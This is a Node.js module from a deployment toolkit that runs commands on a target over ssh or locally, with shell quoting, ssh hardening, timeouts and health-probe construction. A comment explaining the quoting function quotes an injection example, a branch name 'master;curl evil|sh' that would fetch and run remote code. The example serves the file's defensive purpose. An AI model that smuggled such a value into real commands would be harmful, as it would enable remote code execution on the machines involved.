'use strict';

const { execFileSync: nodeExecFileSync } = require('child_process');

// Single-quote a value for safe interpolation into a remote shell command,
// escaping an embedded quote with the standard '\'' idiom. config.js already
// rejects `branch`/`remote` outside a git-refname charset (no shell metacharacters
// legally survive `git check-ref-format`), but that is a config-layer guard a
// caller can bypass (`loadConfig({ validate: false })`) — this is the call-site
// defense-in-depth so an unquoted, attacker-controlled ref (e.g. a target whose
// `origin/HEAD` was renamed to `master;curl evil|sh`) can never reach the shell
// unescaped. Shared by every module that builds a target command (deploy.js,
// release.js, branch.js) so there is ONE quoting implementation, not parallel
// copies that can drift out of sync.
function shQuote(value) {
  return `'${String(value).replace(/'/g, "'\\''")}'`;
}

// Runtime seam so deploy/remote logic is unit-testable: tests inject a fake
// execFileSync and assert the exact command stream (no real ssh/pm2 needed).
//
// `dryRun`/`realExecFileSync` let a caller decide how readOnly probes behave.
// The CLI's deterministic planner supplies the same non-executing function for
// both seams, so no dry-run command contacts the target. Other injected runtimes
// may opt into real read-only probes explicitly. A plain fake runtime
// (every existing test) sets neither, so `dryRun` is false and nothing here
// changes: `execFileSync` is used for every call, exactly as before this option
// existed.
function normalizeRuntime(runtime = {}) {
  return {
    execFileSync: runtime.execFileSync || nodeExecFileSync,
    realExecFileSync: runtime.realExecFileSync || nodeExecFileSync,
    dryRun: runtime.dryRun === true,
  };
}

// ssh.options are passed straight to the ssh command line. A malformed entry
// (not "Key=Value", e.g. a bare flag or an accidental object) would either be
// silently swallowed or produce a confusing ssh parse error. Fail fast and name
// the bad entry, matching assertSafeHeader's precedent below.
const SSH_OPTION_RE = /^[A-Za-z][A-Za-z0-9]*=.+$/;
function assertSafeSshOption(opt) {
  if (typeof opt !== 'string' || !SSH_OPTION_RE.test(opt)) {
    throw new Error(
      `deploy-kit: ssh.options entry ${JSON.stringify(opt)} must be a "Key=Value" string (OpenSSH -o syntax)`
    );
  }
}

// Build the `-o Key=Value` ssh hardening flags from config. Defaults harden
// against a wedged route hanging the deploy: ConnectTimeout bounds the connect,
// ServerAlive* detects a dead session mid-command. Each is opt-out (null omits).
function sshHardeningArgs(ssh = {}) {
  const args = [];
  if (ssh.connectTimeout != null) args.push('-o', `ConnectTimeout=${ssh.connectTimeout}`);
  if (ssh.serverAliveInterval != null) args.push('-o', `ServerAliveInterval=${ssh.serverAliveInterval}`);
  if (ssh.serverAliveCountMax != null) args.push('-o', `ServerAliveCountMax=${ssh.serverAliveCountMax}`);
  for (const opt of ssh.options || []) {
    assertSafeSshOption(opt);
    args.push('-o', opt);
  }
  // Host-key + batch defaults (StrictHostKeyChecking/BatchMode) are pushed LAST,
  // after ssh.options, on purpose: for repeated `-o Key=Value` flags OpenSSH uses
  // the FIRST value it obtains and ignores later duplicates (`man ssh_config`:
  // "the first obtained value will be used"; verified against the installed
  // ssh_config(5)/ssh(1) man pages on this machine). So a user override supplied
  // via ssh.options — e.g. `StrictHostKeyChecking=yes` — must appear BEFORE our
  // default of the same key or it would be silently ignored, which is the exact
  // silently-ignored-config bug this hardening is meant to prevent. Each default
  // is opt-out via an explicit `null`, same convention as connectTimeout etc.
  if (ssh.strictHostKeyChecking != null) args.push('-o', `StrictHostKeyChecking=${ssh.strictHostKeyChecking}`);
  if (ssh.batchMode != null) args.push('-o', `BatchMode=${ssh.batchMode}`);
  return args;
}

// JSON.stringify is for data, not shell quoting. Passing JSON.stringify(script)
// through a controller shell turns intended newlines into literal `\n` tokens
// and expands `$vars` / `$(commands)` before ssh runs. Reject that exact
// representation and direct multiline callers to the stdin-safe API below.
function assertNotJsonEncodedShellScript(command) {
  const trimmed = typeof command === 'string' ? command.trim() : '';
  if (!trimmed.startsWith('"') || !trimmed.endsWith('"')) return;
  try {
    const decoded = JSON.parse(trimmed);
    if (typeof decoded === 'string' && /[\r\n]/.test(decoded)) {
      throw new Error(
        'deploy-kit: refusing a JSON-encoded multiline shell script; pass the original script to runScriptOnTarget()'
      );
    }
  } catch (error) {
    if (error instanceof Error && error.message.startsWith('deploy-kit:')) throw error;
  }
}

// Wrap a command so it runs on the target. In 'ssh' mode we `cd` into the
// project dir first (matching the hand-rolled `ssh host "cd dir && cmd"` idiom)
// and add connect/keepalive timeouts; in 'local' mode (script runs on the box,
// e.g. sano) we run it directly.
function buildTargetCommand(command, { mode, host, projectDir, ssh }) {
  assertNotJsonEncodedShellScript(command);
  if (mode === 'local') {
    const prefix = projectDir ? `cd ${projectDir} && ` : '';
    return { file: 'sh', args: ['-c', `${prefix}${command}`] };
  }
  if (!host) {
    throw new Error('deploy-kit: mode "ssh" requires a `host` (user@host)');
  }
  const remote = projectDir ? `cd ${projectDir} && ${command}` : command;
  return { file: 'ssh', args: [...sshHardeningArgs(ssh), host, remote] };
}

// Run one command on the target. Returns { ok, output, stderr }. With capture:false
// the child inherits stdio (live logs, nothing captured); with capture:true stdout
// is returned as `output`. `stderr` is non-empty ONLY when capture:true AND the
// command failed — execFileSync returns stdout as its value and exposes captured
// stderr solely on the thrown error, and with capture:false stderr went straight to
// the terminal. So `stderr` is '' on success, and '' on failure when not capturing
// (which is most of this module's ~30 call sites). That asymmetry is fine for the
// callers that need it: stderr matters precisely when a command failed, and it is
// where well-behaved CLIs write their diagnostics. Keeping it a SEPARATE field
// (rather than folding it into `output`) preserves `output` as pure stdout for the
// parsers that depend on it — readPm2's JSON.parse, checkDisk's df/awk numbers.
//
// `input` (a string) is fed to the command's STDIN — the injection-safe way to
// hand arbitrary data (a JSON alert payload, a message) to a target command without
// interpolating it into the shell string. ssh forwards stdin to the remote command,
// so it works in both modes. `timeoutSeconds` overrides the per-command bound for
// this call (monitor checks want short bounds, not the 30-minute deploy default).
//
// `readOnly: true` marks a call as a genuinely non-mutating probe (a `cat`/
// `test -f`/`readlink`/`df`/`mv --version` type read) that a caller wants to be
// TRUE regardless of `--dry-run`. It only has
// an effect when the injected runtime also has `dryRun: true`: in that case the
// call uses the runtime's `realExecFileSync` seam. The CLI deliberately binds
// that seam to its deterministic planner too; a specialized caller can bind it
// to a real executor when it wants live read-only preflight. A
// normal deploy run (no `dryRun` on the runtime) is completely unaffected:
// `readOnly` only ever changes behavior under `--dry-run`. Never set this on
// a call that mutates anything.
function runOnTarget(command, config, {
  capture = false, runtime, input, timeoutSeconds, readOnly = false,
} = {}) {
  const normalized = normalizeRuntime(runtime);
  const execFileSync = (readOnly && normalized.dryRun) ? normalized.realExecFileSync : normalized.execFileSync;
  const { file, args } = buildTargetCommand(command, config);
  const hasInput = input != null;
  const execOptions = {
    encoding: 'utf8',
    // stdin is a pipe when we're feeding `input`, otherwise ignored (capture) or
    // inherited (live). stdout/stderr are captured or inherited as before.
    stdio: [hasInput ? 'pipe' : (capture ? 'ignore' : 'inherit'),
      capture ? 'pipe' : 'inherit',
      capture ? 'pipe' : 'inherit'],
  };
  if (hasInput) execOptions.input = input;
  // Kill a hung remote command instead of blocking the pipeline forever. deploy.js
  // holds an atomic lock for the whole run, so a step that never returns blocks
  // every subsequent deploy until someone runs --steal-lock. Enabled by default;
  // an explicit `stepTimeoutSeconds: null` opts out. A per-call `timeoutSeconds`
  // wins when given (0/null → no bound).
  const bound = timeoutSeconds !== undefined ? timeoutSeconds : config.stepTimeoutSeconds;
  if (bound) {
    execOptions.timeout = bound * 1000;
    execOptions.killSignal = 'SIGKILL';
  }
  try {
    const output = execFileSync(file, args, execOptions);
    return { ok: true, output: capture ? String(output || '') : '', stderr: '' };
  } catch (error) {
    // execFileSync surfaces a timeout as ETIMEDOUT; on its own that tells the
    // operator nothing about which step hung or what the bound was.
    if (error && error.code === 'ETIMEDOUT') {
      error.message =
        `Step exceeded the ${bound}s timeout bound and was killed: ${command}`;
    }
    return {
      ok: false,
      output: capture ? String(error.stdout || '') : '',
      stderr: capture ? String(error.stderr || '') : '',
      error,
    };
  }
}

// Execute a multiline POSIX shell program without serializing it into a local
// shell command or ssh argument. ssh forwards this stdin payload unchanged.
function runScriptOnTarget(script, config, {
  capture = false, runtime, timeoutSeconds, readOnly = false,
} = {}) {
  if (typeof script !== 'string' || !script.trim()) {
    throw new Error('deploy-kit: runScriptOnTarget requires a non-empty script');
  }
  return runOnTarget('sh -se', config, {
    capture, runtime, input: script, timeoutSeconds, readOnly,
  });
}

// Header key and value are single-quoted into the curl command with no escaping,
// so a literal single quote in either would break the quoting. Reject early
// (fail-fast on a config typo) rather than emit a subtly broken probe.
function assertSafeHeader(key, value) {
  if (String(key).includes("'") || String(value).includes("'")) {
    throw new Error(`deploy-kit: healthHeaders["${key}"] key/value must not contain a single quote`);
  }
}

// Build the health-probe curl for a config, including any healthHeaders. Apps
// behind a TLS-terminating proxy that force-redirect plain http (e.g. an Express
// `res.redirect(301, https://…)`) return 301 to a direct localhost curl; sending
// `X-Forwarded-Proto: https` via healthHeaders makes them serve the real 200.
//
// Pass a `check` ({ port?, path?, headers? }) to probe a secondary endpoint
// (app + worker fleets); omitted fields fall back to the scalar config.
function buildHealthCommand(config, check = {}) {
  const port = check.port != null ? check.port : config.port;
  const healthPath = check.path != null ? check.path : config.healthPath;
  const headers = check.headers != null ? check.headers : config.healthHeaders;
  const headerArgs = Object.entries(headers || {})
    .map(([key, value]) => {
      assertSafeHeader(key, value);
      return `-H '${key}: ${value}'`;
    })
    .join(' ');
  // Single-quote the URL so a healthPath with shell metacharacters (e.g.
  // `?a=1&b=2`) can't background/truncate the curl on the remote shell.
  const url = `'http://localhost:${port}${healthPath}'`;
  return `curl -f -s ${headerArgs ? `${headerArgs} ` : ''}${url} -o /dev/null -w '%{http_code}'`;
}

module.exports = {
  normalizeRuntime, buildTargetCommand, sshHardeningArgs, runOnTarget,
  runScriptOnTarget, buildHealthCommand, shQuote,
};
